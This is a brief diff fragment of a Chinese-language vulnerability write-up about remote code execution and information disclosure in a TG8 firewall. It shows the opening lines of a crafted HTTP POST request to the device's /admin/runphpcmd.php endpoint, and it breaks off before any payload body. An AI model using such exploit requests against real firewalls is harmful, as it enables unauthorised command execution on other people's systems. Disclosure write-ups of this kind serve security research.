@@ -11,7 +11,7 @@ source: "MrWQ/vulnerability-paper"
 
   
 
-TG8 Firewall RCE 和 信息泄露  
+TG8 Firewall RCE 和 信息泄露  
 
   
 
@@ -107,8 +107,8 @@ function checkLogin() {
 所以我们就可以构造 payload 了，如下：  
 
 ```
-POST /admin/runphpcmd.php HTTP/1.1
-Host: 127.0.0.1
+POST /admin/runphpcmd.php HTTP/1.1
+Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Language: en-US,en;q=0.5
